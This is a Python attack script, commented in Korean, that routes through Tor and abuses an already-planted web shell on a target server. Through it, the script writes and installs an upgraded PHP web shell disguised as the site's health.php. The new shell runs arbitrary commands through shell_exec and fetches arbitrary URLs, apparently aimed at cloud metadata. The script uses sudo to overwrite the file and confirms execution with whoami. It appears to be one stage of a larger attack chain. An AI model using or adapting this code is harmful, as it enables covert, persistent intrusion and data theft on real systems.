#!/usr/bin/env python3
"""
PHP file_put_contents()를 사용한 웹쉘 업로드
"""

import requests
import sys
import urllib.parse

def upload_webshell_via_php(target_ip):
    print(f"[*] PHP file_put_contents()로 웹쉘 업로드")
    print(f"[*] Target: {target_ip}")

    # 새 웹쉘 코드
    webshell_code = r"""<?php
header('Content-Type: text/plain');

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "=== Command Output ===\n";
    $output = shell_exec($cmd . " 2>&1");
    echo $output;
    echo "\n=== End Output ===\n";
} elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $data = @file_get_contents($url, false, $ctx);
    echo $data;
} else {
    echo "OK - Server: " . gethostname() . " - Time: " . date('Y-m-d H:i:s');
}
?>"""

    # PHP 코드로 파일 쓰기
    # 기존 웹쉘을 이용해서 PHP eval()로 파일 작성
    php_write_code = f"file_put_contents('/var/www/html/www/api/health.php.new', base64_decode('{__import__('base64').b64encode(webshell_code.encode()).decode()}')); echo 'WRITTEN';"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    upload_url = f"http://{target_ip}/api/health.php"

    try:
        # Method 1: PHP로 직접 파일 쓰기 시도
        print(f"\n[1] PHP file_put_contents() 시도...")

        # eval을 사용할 수 있는지 확인
        params = {'cmd': "php -r \"echo 'PHP_OK';\""}
        resp = session.get(upload_url, params=params, timeout=15)

        if 'PHP_OK' in resp.text:
            print(f"[+] PHP 명령 실행 가능")

            # 새 웹쉘 작성
            import base64
            encoded = base64.b64encode(webshell_code.encode()).decode()

            php_cmd = f"php -r \"file_put_contents('/tmp/newshell.php', base64_decode('{encoded}')); echo 'WRITTEN';\""
            params = {'cmd': php_cmd}
            resp = session.get(upload_url, params=params, timeout=15)

            if 'WRITTEN' in resp.text:
                print(f"[+] 임시 파일 작성 완료")

                # 임시 파일을 웹쉘 위치로 복사
                params = {'cmd': "sudo cp /tmp/newshell.php /var/www/html/www/api/health.php && sudo chown apache:apache /var/www/html/www/api/health.php && echo 'COPIED'"}
                resp = session.get(upload_url, params=params, timeout=15)

                if 'COPIED' in resp.text:
                    print(f"[+] ✅ 웹쉘 업로드 성공!")
                else:
                    print(f"[-] 복사 실패")
                    return False
            else:
                print(f"[-] 파일 작성 실패")
                return False
        else:
            print(f"[-] PHP 명령 실행 불가")
            print(f"\n[2] Python으로 재시도...")

            # Method 2: Python으로 파일 쓰기
            python_cmd = f"python3 -c \"import base64; open('/tmp/newshell.php','wb').write(base64.b64decode('{encoded}'))\" && echo 'WRITTEN'"
            params = {'cmd': python_cmd}
            resp = session.get(upload_url, params=params, timeout=15)

            if 'WRITTEN' in resp.text:
                print(f"[+] Python으로 임시 파일 작성 완료")

                params = {'cmd': "sudo cp /tmp/newshell.php /var/www/html/www/api/health.php && sudo chown apache:apache /var/www/html/www/api/health.php && echo 'COPIED'"}
                resp = session.get(upload_url, params=params, timeout=15)

                if 'COPIED' in resp.text:
                    print(f"[+] ✅ 웹쉘 업로드 성공!")
                else:
                    print(f"[-] 복사 실패")
                    return False
            else:
                print(f"[-] Python 파일 작성 실패")
                return False

        # 테스트
        print(f"\n[*] 새 웹쉘 테스트 중...")
        params = {'cmd': 'whoami'}
        resp = session.get(upload_url, params=params, timeout=15)

        if "=== Command Output ===" in resp.text:
            output = resp.text.split("=== Command Output ===")[1].split("=== End Output ===")[0].strip()
            if output:
                print(f"[+] ✅ 웹쉘 작동 확인!")
                print(f"    whoami: {output}")
                return True
            else:
                print(f"[-] 출력이 비어있음")
                return False
        else:
            print(f"[-] 웹쉘 응답 형식 오류")
            print(f"    Response: {resp.text[:200]}")
            return False

    except Exception as e:
        print(f"[-] 에러: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    if upload_webshell_via_php(target_ip):
        print(f"\n[+] 이제 136_tor_full_attack.py 실행 가능!")
    else:
        print(f"\n[-] 웹쉘 업로드 실패")
